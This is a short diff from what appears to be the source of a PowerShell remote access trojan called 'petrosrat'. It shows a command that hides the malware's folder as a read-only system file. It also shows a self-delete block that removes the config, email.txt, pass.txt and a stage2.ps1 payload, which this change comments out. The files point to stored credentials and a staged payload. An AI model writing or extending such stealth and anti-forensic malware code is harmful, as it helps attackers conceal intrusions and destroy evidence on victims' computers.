@@ -79,7 +79,7 @@ attrib +h +s +r petrosrat
 
 # self delete
 Set-Location $initial_dir
-Remove-Item $configfile
-Remove-Item email.txt
-Remove-Item pass.txt
-Remove-Item stage2.ps1
+# Remove-Item $configfile
+# Remove-Item email.txt
+# Remove-Item pass.txt
+# Remove-Item stage2.ps1
